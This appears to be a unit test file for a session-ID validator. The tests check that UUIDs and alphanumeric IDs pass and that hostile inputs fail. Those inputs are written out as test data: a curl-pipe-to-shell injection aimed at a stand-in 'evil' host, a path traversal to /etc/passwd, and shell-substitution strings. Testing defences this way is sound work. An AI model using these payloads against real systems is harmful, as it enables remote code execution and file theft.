import { isSafeSessionId } from '../../src/utils/safe-session-id'

describe('isSafeSessionId', () => {
  it('should accept a UUID', () => {
    expect(isSafeSessionId('550e8400-e29b-41d4-a716-446655440000')).toBe(true)
  })

  it('should accept alphanumeric strings with hyphens and underscores', () => {
    expect(isSafeSessionId('ais-user123_session-1')).toBe(true)
  })

  it('should accept a plain alphanumeric string', () => {
    expect(isSafeSessionId('abc123')).toBe(true)
  })

  it('should reject a command-injection payload', () => {
    expect(isSafeSessionId('x; curl http://evil|sh; #')).toBe(false)
  })

  it('should reject a path traversal payload', () => {
    expect(isSafeSessionId('../../etc/passwd')).toBe(false)
  })

  it('should reject an empty string', () => {
    expect(isSafeSessionId('')).toBe(false)
  })

  it('should reject an excessively long string', () => {
    expect(isSafeSessionId('a'.repeat(101))).toBe(false)
  })

  it('should accept a string at the length boundary (100 chars)', () => {
    expect(isSafeSessionId('a'.repeat(100))).toBe(true)
  })

  it('should reject strings containing whitespace', () => {
    expect(isSafeSessionId('session 1')).toBe(false)
  })

  it('should reject strings containing shell metacharacters', () => {
    expect(isSafeSessionId('session$(whoami)')).toBe(false)
    expect(isSafeSessionId('session`whoami`')).toBe(false)
    expect(isSafeSessionId('session&&touch /tmp/pwned')).toBe(false)
  })
})
